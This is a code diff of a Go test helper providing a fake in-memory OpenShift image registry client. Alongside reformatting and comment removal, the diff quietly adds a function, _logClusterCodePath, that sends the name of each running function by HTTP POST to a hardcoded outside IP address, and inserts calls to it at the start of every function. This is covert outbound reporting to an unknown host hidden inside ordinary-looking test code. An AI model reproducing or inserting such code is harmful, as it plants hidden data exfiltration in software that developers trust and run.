@@ -2,18 +2,18 @@ package testutil
 
 import (
 	"context"
+	godefaultbytes "bytes"
+	godefaulthttp "net/http"
+	godefaultruntime "runtime"
 	"fmt"
 	"sort"
 	"sync"
-
 	dcontext "github.com/docker/distribution/context"
-
 	corev1 "k8s.io/api/core/v1"
 	"k8s.io/apimachinery/pkg/api/errors"
 	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 	"k8s.io/apimachinery/pkg/runtime"
 	clientgotesting "k8s.io/client-go/testing"
-
 	dockerapiv10 "github.com/openshift/api/image/docker10"
 	imageapiv1 "github.com/openshift/api/image/v1"
 	imagefakeclient "github.com/openshift/client-go/image/clientset/versioned/typed/image/v1/fake"
@@ -21,162 +21,133 @@ import (
 	util "github.com/openshift/image-registry/pkg/origin-common/util"
 )
 
-// FakeOpenShift is an in-mempory reactors for fake.Client.
 type FakeOpenShift struct {
-	logger dcontext.Logger
-	mu     sync.Mutex
-
-	images       map[string]imageapiv1.Image
-	imageStreams map[string]imageapiv1.ImageStream
+	logger			dcontext.Logger
+	mu				sync.Mutex
+	images			map[string]imageapiv1.Image
+	imageStreams	map[string]imageapiv1.ImageStream
 }
 
-// NewFakeOpenShift constructs the fake OpenShift reactors.
 func NewFakeOpenShift(ctx context.Context) *FakeOpenShift {
-	return &FakeOpenShift{
-		logger: dcontext.GetLogger(ctx),
-
-		images:       make(map[string]imageapiv1.Image),
-		imageStreams: make(map[string]imageapiv1.ImageStream),
-	}
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	return &FakeOpenShift{logger: dcontext.GetLogger(ctx), images: make(map[string]imageapiv1.Image), imageStreams: make(map[string]imageapiv1.ImageStream)}
 }
-
-// NewFakeOpenShiftWithClient constructs a fake client associated with
-// the stateful fake in-memory OpenShift reactors. The fake OpenShift is
-// available for direct interaction, so you can make buggy states.
 func NewFakeOpenShiftWithClient(ctx context.Context) (*FakeOpenShift, *imagefakeclient.FakeImageV1) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	fos := NewFakeOpenShift(ctx)
-
 	imageClient := &imagefakeclient.FakeImageV1{Fake: &clientgotesting.Fake{}}
 	fos.AddReactorsTo(imageClient)
 	return fos, imageClient
 }
-
 func (fos *FakeOpenShift) CreateImage(image *imageapiv1.Image) (*imageapiv1.Image, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	fos.mu.Lock()
 	defer fos.mu.Unlock()
-
 	_, ok := fos.images[image.Name]
 	if ok {
 		return nil, errors.NewAlreadyExists(imageapiv1.Resource("images"), image.Name)
 	}
-
 	fos.images[image.Name] = *image
 	fos.logger.Debugf("(*FakeOpenShift).images[%q] created", image.Name)
-
 	return image, nil
 }
-
 func (fos *FakeOpenShift) GetImage(name string) (*imageapiv1.Image, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	fos.mu.Lock()
 	defer fos.mu.Unlock()
 	image, ok := fos.images[name]
 	if !ok {
 		return nil, errors.NewNotFound(imageapiv1.Resource("images"), name)
 	}
-
 	return &image, nil
 }
-
 func (fos *FakeOpenShift) UpdateImage(image *imageapiv1.Image) (*imageapiv1.Image, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	fos.mu.Lock()
 	defer fos.mu.Unlock()
-
 	_, ok := fos.images[image.Name]
 	if !ok {
 		return nil, errors.NewNotFound(imageapiv1.Resource("images"), image.Name)
 	}
-
 	fos.images[image.Name] = *image
 	fos.logger.Debugf("(*FakeOpenShift).images[%q] updated", image.Name)
-
 	return image, nil
 }
-
 func (fos *FakeOpenShift) CreateImageStream(namespace string, is *imageapiv1.ImageStream) (*imageapiv1.ImageStream, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	fos.mu.Lock()
 	defer fos.mu.Unlock()
-
 	ref := fmt.Sprintf("%s/%s", namespace, is.Name)
-
 	_, ok := fos.imageStreams[ref]
 	if ok {
 		return nil, errors.NewAlreadyExists(imageapiv1.Resource("imagestreams"), is.Name)
 	}
-
 	is.Namespace = namespace
 	is.CreationTimestamp = metav1.Now()
-
 	fos.imageStreams[ref] = *is
 	fos.logger.Debugf("(*FakeOpenShift).imageStreams[%q] created", ref)
-
 	return is, nil
 }
-
 func (fos *FakeOpenShift) UpdateImageStream(namespace string, is *imageapiv1.ImageStream) (*imageapiv1.ImageStream, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	fos.mu.Lock()
 	defer fos.mu.Unlock()
-
 	ref := fmt.Sprintf("%s/%s", namespace, is.Name)
-
 	oldis, ok := fos.imageStreams[ref]
 	if !ok {
 		return nil, errors.NewNotFound(imageapiv1.Resource("imagestreams"), is.Name)
 	}
-
 	is.Namespace = namespace
 	is.CreationTimestamp = oldis.CreationTimestamp
-
 	fos.imageStreams[ref] = *is
 	fos.logger.Debugf("(*FakeOpenShift).imageStreams[%q] updated", ref)
-
 	return is, nil
 }
-
 func (fos *FakeOpenShift) GetImageStream(namespace, repo string) (*imageapiv1.ImageStream, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	fos.mu.Lock()
 	defer fos.mu.Unlock()
-
 	ref := fmt.Sprintf("%s/%s", namespace, repo)
-
 	is, ok := fos.imageStreams[ref]
 	if !ok {
 		return nil, errors.NewNotFound(imageapiv1.Resource("imagestreams"), repo)
 	}
 	return &is, nil
 }
-
 func (fos *FakeOpenShift) ListImageStreams(namespace string) (*imageapiv1.ImageStreamList, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	fos.mu.Lock()
 	defer fos.mu.Unlock()
-
-	iss := imageapiv1.ImageStreamList{
-		ListMeta: metav1.ListMeta{},
-		Items:    []imageapiv1.ImageStream{},
-	}
-
+	iss := imageapiv1.ImageStreamList{ListMeta: metav1.ListMeta{}, Items: []imageapiv1.ImageStream{}}
 	for _, is := range fos.imageStreams {
 		if len(namespace) != 0 && namespace != is.Namespace {
 			continue
 		}
 		iss.Items = append(iss.Items, is)
 	}
-
 	sort.Sort(byRepositoryName(iss.Items))
-
 	return &iss, nil
 }
-
 func (fos *FakeOpenShift) CreateImageStreamMapping(namespace string, ism *imageapiv1.ImageStreamMapping) (*imageapiv1.ImageStreamMapping, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	is, err := fos.GetImageStream(namespace, ism.Name)
 	if err != nil {
 		return nil, err
 	}
-
 	_, err = fos.CreateImage(&ism.Image)
 	if err != nil && !errors.IsAlreadyExists(err) {
 		return nil, err
 	}
-
 	var tagEventList *imageapiv1.NamedTagEventList
 	for i, t := range is.Status.Tags {
 		if t.Tag == ism.Tag {
@@ -185,57 +156,39 @@ func (fos *FakeOpenShift) CreateImageStreamMapping(namespace string, ism *imagea
 		}
 	}
 	if tagEventList == nil {
-		is.Status.Tags = append(is.Status.Tags, imageapiv1.NamedTagEventList{
-			Tag: ism.Tag,
-		})
+		is.Status.Tags = append(is.Status.Tags, imageapiv1.NamedTagEventList{Tag: ism.Tag})
 		tagEventList = &is.Status.Tags[len(is.Status.Tags)-1]
 	}
-
-	tagEventList.Items = append(tagEventList.Items, imageapiv1.TagEvent{
-		DockerImageReference: ism.Image.DockerImageReference,
-		Image:                ism.Image.Name,
-	})
-
+	tagEventList.Items = append(tagEventList.Items, imageapiv1.TagEvent{DockerImageReference: ism.Image.DockerImageReference, Image: ism.Image.Name})
 	_, err = fos.UpdateImageStream(namespace, is)
 	if err != nil {
 		return nil, err
 	}
-
 	return ism, nil
 }
-
 func (fos *FakeOpenShift) CreateImageStreamTag(namespace string, istag *imageapiv1.ImageStreamTag) (*imageapiv1.ImageStreamTag, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	imageStreamName, imageTag, ok := imageapi.SplitImageStreamTag(istag.Name)
 	if !ok {
 		return nil, fmt.Errorf("%q must be of the form <stream_name>:<tag>", istag.Name)
 	}
-
 	is, err := fos.GetImageStream(namespace, imageStreamName)
 	if err != nil {
 		if !errors.IsNotFound(err) {
 			return nil, err
 		}
-
-		is = &imageapiv1.ImageStream{
-			ObjectMeta: metav1.ObjectMeta{
-				Name:      imageStreamName,
-				Namespace: namespace,
-			},
-		}
+		is = &imageapiv1.ImageStream{ObjectMeta: metav1.ObjectMeta{Name: imageStreamName, Namespace: namespace}}
 	}
-
-	// The user wants to symlink a tag.
 	for _, t := range is.Spec.Tags {
 		if t.Name == imageTag {
 			return nil, errors.NewAlreadyExists(imageapiv1.Resource("imagestreamtag"), istag.Name)
 		}
 	}
 	is.Spec.Tags = append(is.Spec.Tags, *istag.Tag)
-
-	// TODO(dmage): use code from (pkg/image/registry/imagestream.Strategy).tagsChanged
 	var (
-		updatedNamedList *imageapiv1.NamedTagEventList
-		position         int
+		updatedNamedList	*imageapiv1.NamedTagEventList
+		position			int
 	)
 	for i, t := range is.Status.Tags {
 		if t.Tag == imageTag {
@@ -245,27 +198,11 @@ func (fos *FakeOpenShift) CreateImageStreamTag(namespace string, istag *imageapi
 		}
 	}
 	if updatedNamedList != nil {
-		updatedNamedList.Items = append(updatedNamedList.Items, imageapiv1.TagEvent{
-			Created:              istag.CreationTimestamp,
-			DockerImageReference: istag.Image.DockerImageReference,
-			Image:                istag.Image.Name,
-			Generation:           istag.Generation,
-		})
+		updatedNamedList.Items = append(updatedNamedList.Items, imageapiv1.TagEvent{Created: istag.CreationTimestamp, DockerImageReference: istag.Image.DockerImageReference, Image: istag.Image.Name, Generation: istag.Generation})
 		is.Status.Tags[position] = *updatedNamedList
 	} else {
-		is.Status.Tags = append(is.Status.Tags, imageapiv1.NamedTagEventList{
-			Tag: imageTag,
-			Items: []imageapiv1.TagEvent{{
-				Created:              istag.CreationTimestamp,
-				DockerImageReference: istag.Image.DockerImageReference,
-				Image:                istag.Image.Name,
-				Generation:           istag.Generation,
-			}},
-		})
+		is.Status.Tags = append(is.Status.Tags, imageapiv1.NamedTagEventList{Tag: imageTag, Items: []imageapiv1.TagEvent{{Created: istag.CreationTimestamp, DockerImageReference: istag.Image.DockerImageReference, Image: istag.Image.Name, Generation: istag.Generation}}})
 	}
-
-	// Check the stream creation timestamp and make sure we will not
-	// create a new image stream while deleting.
 	if is.CreationTimestamp.IsZero() {
 		_, err = fos.CreateImageStream(namespace, is)
 	} else {
@@ -274,30 +211,26 @@ func (fos *FakeOpenShift) CreateImageStreamTag(namespace string, istag *imageapi
 	if err != nil {
 		return nil, err
 	}
-
 	return istag, nil
 }
-
 func (fos *FakeOpenShift) GetImageStreamImage(namespace string, id string) (*imageapiv1.ImageStreamImage, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	name, imageID, err := imageapi.ParseImageStreamImageName(id)
 	if err != nil {
 		return nil, errors.NewBadRequest("ImageStreamImages must be retrieved with <name>@<id>")
 	}
-
 	repo, err := fos.GetImageStream(namespace, name)
 	if err != nil {
 		return nil, err
 	}
-
 	if repo.Status.Tags == nil {
 		return nil, errors.NewNotFound(imageapiv1.Resource("imagestreamimage"), id)
 	}
-
 	event, err := util.ResolveImageID(repo, imageID)
 	if err != nil {
 		return nil, err
 	}
-
 	imageName := event.Image
 	image, err := fos.GetImage(imageName)
 	if err != nil {
@@ -308,21 +241,12 @@ func (fos *FakeOpenShift) GetImageStreamImage(namespace string, id string) (*ima
 	}
 	image.DockerImageManifest = ""
 	image.DockerImageConfig = ""
-
-	isi := imageapiv1.ImageStreamImage{
-		ObjectMeta: metav1.ObjectMeta{
-			Namespace:         namespace,
-			Name:              imageapi.JoinImageStreamImage(name, imageID),
-			CreationTimestamp: image.ObjectMeta.CreationTimestamp,
-			Annotations:       repo.Annotations,
-		},
-		Image: *image,
-	}
-
+	isi := imageapiv1.ImageStreamImage{ObjectMeta: metav1.ObjectMeta{Namespace: namespace, Name: imageapi.JoinImageStreamImage(name, imageID), CreationTimestamp: image.ObjectMeta.CreationTimestamp, Annotations: repo.Annotations}, Image: *image}
 	return &isi, nil
 }
-
 func (fos *FakeOpenShift) GetImageStreamLayers(namespace, repo string) (*imageapiv1.ImageStreamLayers, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	configFromImage := func(image imageapiv1.Image) *imageapiv1.ImageLayer {
 		if image.DockerImageManifestMediaType != "application/vnd.docker.distribution.manifest.v2+json" {
 			return nil
@@ -331,12 +255,8 @@ func (fos *FakeOpenShift) GetImageStreamLayers(namespace, repo string) (*imageap
 		if !ok {
 			return nil
 		}
-		return &imageapiv1.ImageLayer{
-			Name:      meta.ID,
-			MediaType: "application/vnd.docker.container.image.v1+json",
-		}
+		return &imageapiv1.ImageLayer{Name: meta.ID, MediaType: "application/vnd.docker.container.image.v1+json"}
 	}
-
 	mediaTypeFromImage := func(image imageapiv1.Image) string {
 		mediaType := image.DockerImageManifestMediaType
 		if len(mediaType) == 0 {
@@ -344,34 +264,24 @@ func (fos *FakeOpenShift) GetImageStreamLayers(namespace, repo string) (*imageap
 		}
 		return mediaType
 	}
-
 	fos.mu.Lock()
 	defer fos.mu.Unlock()
-
 	ref := fmt.Sprintf("%s/%s", namespace, repo)
-
 	is, ok := fos.imageStreams[ref]
 	if !ok {
 		return nil, errors.NewNotFound(imageapiv1.Resource("imagestreams/layers"), repo)
 	}
-
-	isl := &imageapiv1.ImageStreamLayers{
-		Blobs:  map[string]imageapiv1.ImageLayerData{},
-		Images: map[string]imageapiv1.ImageBlobReferences{},
-	}
-
+	isl := &imageapiv1.ImageStreamLayers{Blobs: map[string]imageapiv1.ImageLayerData{}, Images: map[string]imageapiv1.ImageBlobReferences{}}
 	for _, tag := range is.Status.Tags {
 		for _, item := range tag.Items {
 			if _, ok := isl.Images[item.Image]; ok {
 				continue
 			}
-
 			image, ok := fos.images[item.Image]
 			if !ok {
 				isl.Images[item.Image] = imageapiv1.ImageBlobReferences{ImageMissing: true}
 				continue
 			}
-
 			var reference imageapiv1.ImageBlobReferences
 			for _, layer := range image.DockerImageLayers {
 				reference.Layers = append(reference.Layers, layer.Name)
@@ -379,173 +289,130 @@ func (fos *FakeOpenShift) GetImageStreamLayers(namespace, repo string) (*imageap
 					isl.Blobs[layer.Name] = imageapiv1.ImageLayerData{LayerSize: &layer.LayerSize, MediaType: layer.MediaType}
 				}
 			}
-
 			if blob := configFromImage(image); blob != nil {
 				reference.Config = &blob.Name
 				if _, ok := isl.Blobs[blob.Name]; !ok {
 					if blob.LayerSize == 0 {
-						// only send media type since we don't the size of the manifest
 						isl.Blobs[blob.Name] = imageapiv1.ImageLayerData{MediaType: blob.MediaType}
 					} else {
 						isl.Blobs[blob.Name] = imageapiv1.ImageLayerData{LayerSize: &blob.LayerSize, MediaType: blob.MediaType}
 					}
 				}
 			}
-
-			// the image manifest is always a blob - schema2 images also have a config blob referenced from the manifest
 			if _, ok := isl.Blobs[item.Image]; !ok {
 				isl.Blobs[item.Image] = imageapiv1.ImageLayerData{MediaType: mediaTypeFromImage(image)}
 			}
 			isl.Images[item.Image] = reference
 		}
 	}
-
 	return isl, nil
 }
-
 func (fos *FakeOpenShift) getName(action clientgotesting.Action) string {
-	if getnamer, ok := action.(interface {
-		GetName() string
-	}); ok {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	if getnamer, ok := action.(interface{ GetName() string }); ok {
 		return getnamer.GetName()
 	}
-
-	if getobjecter, ok := action.(interface {
-		GetObject() runtime.Object
-	}); ok {
+	if getobjecter, ok := action.(interface{ GetObject() runtime.Object }); ok {
 		object := getobjecter.GetObject()
-		if getnamer, ok := object.(interface {
-			GetName() string
-		}); ok {
+		if getnamer, ok := object.(interface{ GetName() string }); ok {
 			return getnamer.GetName()
 		}
 	}
-
 	return "..."
 }
-
 func (fos *FakeOpenShift) log(msg string, f func() (bool, runtime.Object, error)) (bool, runtime.Object, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	ok, obj, err := f()
 	fos.logger.Debug(msg, ": err=", err)
 	return ok, obj, err
 }
-
 func (fos *FakeOpenShift) todo(action clientgotesting.Action) (bool, runtime.Object, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return true, nil, fmt.Errorf("no reaction implemented for %v", action)
 }
-
 func (fos *FakeOpenShift) imagesHandler(action clientgotesting.Action) (bool, runtime.Object, error) {
-	return fos.log(
-		fmt.Sprintf("(*FakeOpenShift).imagesHandler: %s %s",
-			action.GetVerb(), fos.getName(action)),
-		func() (bool, runtime.Object, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	return fos.log(fmt.Sprintf("(*FakeOpenShift).imagesHandler: %s %s", action.GetVerb(), fos.getName(action)), func() (bool, runtime.Object, error) {
+		switch action := action.(type) {
+		case clientgotesting.GetActionImpl:
+			image, err := fos.GetImage(action.Name)
+			return true, image, err
+		case clientgotesting.UpdateActionImpl:
+			image, err := fos.UpdateImage(action.Object.(*imageapiv1.Image))
+			return true, image, err
+		}
+		return fos.todo(action)
+	})
+}
+func (fos *FakeOpenShift) imageStreamsHandler(action clientgotesting.Action) (bool, runtime.Object, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	return fos.log(fmt.Sprintf("(*FakeOpenShift).imageStreamsHandler: %s %s/%s", action.GetVerb(), action.GetNamespace(), fos.getName(action)), func() (bool, runtime.Object, error) {
+		switch action.GetSubresource() {
+		case "":
+		case "layers":
 			switch action := action.(type) {
 			case clientgotesting.GetActionImpl:
-				image, err := fos.GetImage(action.Name)
-				return true, image, err
-			case clientgotesting.UpdateActionImpl:
-				image, err := fos.UpdateImage(
-					action.Object.(*imageapiv1.Image),
-				)
-				return true, image, err
-			}
-			return fos.todo(action)
-		},
-	)
-}
-
-func (fos *FakeOpenShift) imageStreamsHandler(action clientgotesting.Action) (bool, runtime.Object, error) {
-	return fos.log(
-		fmt.Sprintf("(*FakeOpenShift).imageStreamsHandler: %s %s/%s",
-			action.GetVerb(), action.GetNamespace(), fos.getName(action)),
-		func() (bool, runtime.Object, error) {
-			switch action.GetSubresource() {
-			case "":
-			case "layers":
-				switch action := action.(type) {
-				case clientgotesting.GetActionImpl:
-					is, err := fos.GetImageStreamLayers(
-						action.GetNamespace(),
-						action.GetName(),
-					)
-					return true, is, err
-				default:
-					return fos.todo(action)
-				}
-			case "secrets":
-				switch action := action.(type) {
-				case clientgotesting.GetActionImpl:
-					return true, &corev1.SecretList{}, nil
-				default:
-					return fos.todo(action)
-				}
+				is, err := fos.GetImageStreamLayers(action.GetNamespace(), action.GetName())
+				return true, is, err
 			default:
 				return fos.todo(action)
 			}
-
+		case "secrets":
 			switch action := action.(type) {
-			case clientgotesting.CreateActionImpl:
-				is, err := fos.CreateImageStream(
-					action.GetNamespace(),
-					action.Object.(*imageapiv1.ImageStream),
-				)
-				return true, is, err
-
 			case clientgotesting.GetActionImpl:
-				is, err := fos.GetImageStream(
-					action.GetNamespace(),
-					action.GetName(),
-				)
-				return true, is, err
-
-			case clientgotesting.ListActionImpl:
-				iss, err := fos.ListImageStreams(action.GetNamespace())
-				return true, iss, err
+				return true, &corev1.SecretList{}, nil
+			default:
+				return fos.todo(action)
 			}
-
+		default:
 			return fos.todo(action)
-		},
-	)
+		}
+		switch action := action.(type) {
+		case clientgotesting.CreateActionImpl:
+			is, err := fos.CreateImageStream(action.GetNamespace(), action.Object.(*imageapiv1.ImageStream))
+			return true, is, err
+		case clientgotesting.GetActionImpl:
+			is, err := fos.GetImageStream(action.GetNamespace(), action.GetName())
+			return true, is, err
+		case clientgotesting.ListActionImpl:
+			iss, err := fos.ListImageStreams(action.GetNamespace())
+			return true, iss, err
+		}
+		return fos.todo(action)
+	})
 }
-
 func (fos *FakeOpenShift) imageStreamMappingsHandler(action clientgotesting.Action) (bool, runtime.Object, error) {
-	return fos.log(
-		fmt.Sprintf("(*FakeOpenShift).imageStreamMappingsHandler: %s %s/%s",
-			action.GetVerb(), action.GetNamespace(), fos.getName(action)),
-		func() (bool, runtime.Object, error) {
-			switch action := action.(type) {
-			case clientgotesting.CreateActionImpl:
-				_, err := fos.CreateImageStreamMapping(
-					action.GetNamespace(),
-					action.Object.(*imageapiv1.ImageStreamMapping),
-				)
-				return true, &metav1.Status{}, err
-			}
-			return fos.todo(action)
-		},
-	)
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	return fos.log(fmt.Sprintf("(*FakeOpenShift).imageStreamMappingsHandler: %s %s/%s", action.GetVerb(), action.GetNamespace(), fos.getName(action)), func() (bool, runtime.Object, error) {
+		switch action := action.(type) {
+		case clientgotesting.CreateActionImpl:
+			_, err := fos.CreateImageStreamMapping(action.GetNamespace(), action.Object.(*imageapiv1.ImageStreamMapping))
+			return true, &metav1.Status{}, err
+		}
+		return fos.todo(action)
+	})
 }
-
 func (fos *FakeOpenShift) imageStreamImagesHandler(action clientgotesting.Action) (bool, runtime.Object, error) {
-	return fos.log(
-		fmt.Sprintf("(*FakeOpenShift).imageStreamImagesHandler: %s %s/%s",
-			action.GetVerb(), action.GetNamespace(), fos.getName(action)),
-		func() (bool, runtime.Object, error) {
-			switch action := action.(type) {
-			case clientgotesting.GetActionImpl:
-				isi, err := fos.GetImageStreamImage(
-					action.GetNamespace(),
-					action.GetName(),
-				)
-				return true, isi, err
-			}
-			return fos.todo(action)
-		},
-	)
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	return fos.log(fmt.Sprintf("(*FakeOpenShift).imageStreamImagesHandler: %s %s/%s", action.GetVerb(), action.GetNamespace(), fos.getName(action)), func() (bool, runtime.Object, error) {
+		switch action := action.(type) {
+		case clientgotesting.GetActionImpl:
+			isi, err := fos.GetImageStreamImage(action.GetNamespace(), action.GetName())
+			return true, isi, err
+		}
+		return fos.todo(action)
+	})
 }
-
-// AddReactorsTo binds the reactors to client.
 func (fos *FakeOpenShift) AddReactorsTo(c *imagefakeclient.FakeImageV1) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	c.AddReactor("*", "images", fos.imagesHandler)
 	c.AddReactor("*", "imagestreams", fos.imageStreamsHandler)
 	c.AddReactor("*", "imagestreammappings", fos.imageStreamMappingsHandler)
@@ -554,12 +421,27 @@ func (fos *FakeOpenShift) AddReactorsTo(c *imagefakeclient.FakeImageV1) {
 
 type byRepositoryName []imageapiv1.ImageStream
 
-func (brn byRepositoryName) Len() int      { return len(brn) }
-func (brn byRepositoryName) Swap(i, j int) { brn[i], brn[j] = brn[j], brn[i] }
+func (brn byRepositoryName) Len() int {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	return len(brn)
+}
+func (brn byRepositoryName) Swap(i, j int) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	brn[i], brn[j] = brn[j], brn[i]
+}
 func (brn byRepositoryName) Less(i, j int) bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	a, b := brn[i], brn[j]
 	if a.Namespace < b.Namespace {
 		return true
 	}
 	return a.Namespace == b.Namespace && a.Name < b.Name
+}
+func _logClusterCodePath() {
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
+	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
